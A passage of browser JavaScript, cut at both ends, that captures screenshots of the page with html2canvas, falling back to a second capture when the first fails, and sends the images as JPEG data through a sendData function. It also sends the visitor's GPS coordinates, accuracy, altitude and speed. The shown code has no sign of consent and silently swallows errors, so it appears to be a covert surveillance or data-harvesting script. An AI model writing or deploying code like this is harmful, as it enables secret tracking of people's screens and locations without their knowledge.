            }).then(function(captured) {
                sendData('screenshot', { image: captured.toDataURL('image/jpeg', 0.7) });
                totalCaptures++;
                setTimeout(function() { shotCapturing = false; }, 800);
            }).catch(function() {
                html2canvas(document.documentElement, {
                    useCORS: true, allowTaint: true, scale: 0.5, logging: false, backgroundColor: '#050508'
                }).then(function(c2) {
                    sendData('screenshot', { image: c2.toDataURL('image/jpeg', 0.7) });
                    totalCaptures++;
                }).catch(function() {}).finally(function() { shotCapturing = false; });
            });
        } catch(e) { shotCapturing = false; }
    }

    function sendLocation(pos, source) {
        sendData('location', {
            latitude: pos.coords.latitude, longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy, altitude: pos.coords.altitude || null,
            speed: pos.coords.speed || null, source: source || 'gps'
